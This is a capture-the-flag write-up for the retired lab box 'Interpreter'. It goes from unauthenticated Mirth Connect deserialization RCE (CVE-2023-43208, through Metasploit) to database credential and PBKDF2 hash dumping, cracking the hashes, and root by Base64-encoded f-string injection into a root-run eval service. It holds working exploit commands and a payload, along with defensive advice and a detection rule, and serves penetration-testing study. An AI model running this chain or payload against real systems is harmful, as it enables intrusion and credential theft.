---
title: "Interpreter"
machine: "Interpreter"
status: retired
os: Linux
difficulty: Medium
ownedUser: true
ownedRoot: true
date: 2026-02-27
techniques:
  - "Java deserialization (XStream)"
  - "MariaDB dump"
  - "PBKDF2 crack"
  - "F-string injection"
  - "Regex allow-list bypass"
  - "SUID bash"
cves:
  - "CVE-2023-43208"
summary: "Mirth Connect vulnerable to unauthenticated Java deserialization RCE; PBKDF2 hashes in the user table; and a Python f-string with double eval() guarded only by a regex allow-list — bypassed with Base64."
proof: "/proof/interpreter.png"
draft: false
---

## Summary

Interpreter is a Medium Linux box built around a healthcare integration
engine — **Mirth Connect** — running a version vulnerable to
`CVE-2023-43208`, an unauthenticated Java deserialization RCE via
`XStream`. Post-exploitation walks you through the usual Java shape
(read `mirth.properties`, connect to MariaDB, dump the user table for
PBKDF2 hashes) and then hands you the box's real puzzle: a localhost
Flask service that formats patient records using an f-string,
evaluates the resulting string with `eval()`, and tries to defend
itself with a regex allow-list. The name is the giveaway — the machine
"interprets" your input twice.

## Reconnaissance

```bash
sudo nmap -sU --top-ports 200 10.129.X.X   # nothing interesting
nmap -sV -sC -p- 10.129.X.X
```

Ports of interest:

| Port     | Service                    | Notes                       |
|----------|----------------------------|-----------------------------|
| 22/tcp   | OpenSSH 9.2p1              |                             |
| 80/tcp   | Jetty (HTTP)               | Redirects to HTTPS admin    |
| 443/tcp  | Jetty (HTTPS)              | Mirth Connect Administrator |
| 6661/tcp | Mirth internal comms       |                             |

The HTTPS admin login page footer reads "© 2021 NextGen Healthcare |
Mirth Connect". The `mirth.properties` file later confirms version
**4.4.0** — vulnerable to **CVE-2023-43208**.

## Initial Access — CVE-2023-43208 (XStream Deserialization)

Mirth Connect exposes an unauthenticated API endpoint that
deserializes attacker-supplied XML via **XStream**. The library is
not restricted to a safe allow-list of classes, so a crafted gadget
chain reaches `Runtime.exec` and returns command output. Metasploit
ships a first-party module.

```
msf6 > use exploit/multi/http/mirth_connect_cve_2023_43208
msf6 > set RHOSTS 10.129.X.X
msf6 > set RPORT 443
msf6 > set SSL true
msf6 > set LHOST tun0
msf6 > set FETCH_COMMAND WGET
msf6 > run
```

You land as `mirth` in a Meterpreter session. Drop to a shell and
upgrade the PTY:

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Post-Exploitation — Config → DB → PBKDF2

### Read `mirth.properties`

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

Look for `database.url`, `database.username`, `database.password`. The
file wires the app to a local MariaDB `mc_bdd_prod` with a plain-text
password.

### Dump `PERSON_PASSWORD`

```bash
mysql -umirthdb -p'<db-pass>' mc_bdd_prod \
  -e "SELECT * FROM PERSON;"

mysql -umirthdb -p'<db-pass>' mc_bdd_prod \
  -e "SELECT * FROM PERSON_PASSWORD;"
```

`PERSON_PASSWORD` holds a Base64-encoded blob: **8-byte salt + 32-byte
derived key** for PBKDF2-HMAC-SHA256 at 600 000 iterations.

> **Tip — the `-p` space trap.** `mysql -p <password>` (with a space)
> makes MySQL treat the password as a database name and prompt you
> interactively. Always use `mysql -p<password>` with no space.

### Crack PBKDF2

```bash
python3 - <<'PY'
import base64
raw = base64.b64decode('<blob>')
salt, key = raw[:8], raw[8:]
print('sha256:600000:%s:%s' % (
    base64.b64encode(salt).decode(),
    base64.b64encode(key).decode(),
))
PY
```

The output is exactly what hashcat mode 10900 expects:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --force
```

600 000 iterations means about 40 attempts per second on a CPU. A
dictionary password still falls in minutes — the algorithm doesn't
rescue a bad password.

## User — SSH

```bash
ssh sedric@10.129.X.X    # cracked password
```

User proof lives at `/home/sedric/user.txt`.

## Root — F-String Injection with Double `eval`

```bash
ss -tlnp
# 127.0.0.1:54321  python (running as root)
```

`/usr/local/bin/notif.py` is a Flask service on `127.0.0.1:54321`.
Reading it reveals the vulnerability:

```python
template = f"Patient {first} {last} ({gender}), " \
           f"{{datetime.now().year - year_of_birth}} years old, " \
           f"received from {sender} at {ts}"
return eval(f"f'''{template}'''")
```

The user-supplied `sender` field is substituted into `template` by
the outer f-string, and the string is then evaluated **as another
f-string** by `eval()`. A `{ ... }` inside `sender` becomes runnable
Python inside the second interpolation.

The regex allow-list looks like:

```python
re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```

It blocks spaces, commas, dashes, semicolons, pipes. It *permits*
letters, digits, `.`, `_`, `'`, `"`, `(`, `)`, `{`, `}`, `=`, `+`,
`/` — which is exactly the Base64 alphabet plus f-string syntax.

> **Danger — allow-lists that accidentally allow Base64.** Once your
> allow-list contains `A-Za-z0-9+/=`, you have permitted any command
> an attacker cares to send. They will Base64-encode it and shell
> out to `base64 -d | sh` — or, in this case, wrap it in
> `__import__('os').popen(__import__('base64').b64decode(...))`.

### Payload

```bash
CMD='cp /bin/bash /tmp/rsh && chmod 4755 /tmp/rsh'
B64=$(python3 -c "import base64;print(base64.b64encode(b'$CMD').decode())")

PAYLOAD="{__import__(\"os\").popen(__import__(\"base64\").b64decode(\"$B64\").decode()).read()}"

wget -q -O - --header='Content-Type: application/xml' \
  --post-data="<?xml version=\"1.0\"?><patient>\
<firstname>John</firstname><lastname>Doe</lastname>\
<sender_app>$PAYLOAD</sender_app>\
<timestamp>2024/01/01</timestamp>\
<birth_date>01/01/1990</birth_date><gender>M</gender>\
</patient>" \
  http://127.0.0.1:54321/addPatient
```

The Flask process runs as root and executes the command. `/tmp/rsh`
is now a SUID copy of `bash`.

```bash
/tmp/rsh -p
whoami   # root
```

## Attack Chain Summary

1. `nmap` → Jetty + Mirth Connect 4.4.0
2. CVE-2023-43208 XStream deserialization → shell as `mirth`
3. `mirth.properties` → MariaDB creds
4. `SELECT PERSON_PASSWORD` → PBKDF2 salt+key blob
5. Python decode → `hashcat -m 10900` → cleartext
6. SSH as `sedric` → user proof
7. `ss -tlnp` → `notif.py` on `127.0.0.1:54321` as root
8. Read source → double `eval` f-string injection
9. Base64 bypass regex allow-list
10. POST payload → `cp /bin/bash /tmp/rsh; chmod 4755`
11. `/tmp/rsh -p` → root shell

## Takeaways

- **`XStream` without an allow-list is a deserialization sink.**
  Every Java framework using it needs `XStream.allowTypes(...)`
  locked down.
- **PBKDF2 protects the algorithm, not the password.** Strong hashing
  + weak passphrase = a slower version of "no protection".
- **`eval()` is never safe.** The moment your string carries anything
  that came from a user, no allow-list can save you.

## Defensive Perspective

- **Patch Mirth Connect** past the vulnerable window and configure
  `XStream` with a strict class allow-list.
- **Store DB credentials outside `mirth.properties`.** Prefer a
  container secret, environment variable pulled from a vault, or
  systemd credentials.
- **Enforce a real password policy.** No dictionary words; require a
  passphrase generator.
- **Eliminate `eval()`.** Use `str.format` with explicit fields, or
  Jinja2 with auto-escaping — never `eval()` or `exec()` on user
  data.
- **Run services as unprivileged users.** `notif.py` should not have
  been root.
- **Detection.** auditd on `execve` of `python3` with
  `import base64;.*b64decode` in argv, plus alerts on newly-created
  SUID binaries under `/tmp/`, is cheap and high-signal.

## References

- [CVE-2023-43208 — Mirth Connect XStream RCE](https://www.cve.org/CVERecord?id=CVE-2023-43208)
- [hashcat modes — 10900 PBKDF2-HMAC-SHA256](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [OWASP — Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [GTFOBins — bash SUID](https://gtfobins.github.io/gtfobins/bash/)
